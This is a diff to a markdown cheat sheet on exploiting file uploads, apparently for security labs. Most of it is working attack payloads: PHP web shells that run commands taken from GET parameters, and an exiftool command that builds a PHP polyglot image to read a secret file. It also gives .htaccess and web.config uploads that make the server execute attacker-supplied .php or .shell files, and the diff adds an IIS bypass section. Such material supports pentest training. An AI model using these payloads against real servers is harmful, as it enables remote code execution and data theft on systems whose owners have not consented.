@@ -7,17 +7,32 @@
 <?php passthru($_GET['cyborg71']); ?> >> For system command*
 exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" hacker.jpg -o polyglot.php
 ```
-
-## Apache Bypass
+## Exploiting Server Configuration
+___
+### Apache Bypass
 ```
-Before:
+Step 1 >>
 filename=".htaccess"
 Content-Type: text/plain
 AddType application/x-httpd-php .shell
-After:
+Step 2 >>
 Content-Type: application/x-httpd-php
+<?php system($_GET['cmd']); ?>
 ```
-
+### IIS Bypass
+```
+Step 1 >>
+filename="web.config"
+Content-Type: text/plain
+<system.webServer>
+    <staticContent>
+        <mimeMap fileExtension=".php" mimeType="application/x-httpd-php" />
+    </staticContent>
+</system.webServer>
+Step 2 >>
+Content-Type: application/x-httpd-php
+<?php system($_GET['cmd']); ?>
+```
 ## Obfuscating File Extensions
 ```
 .php
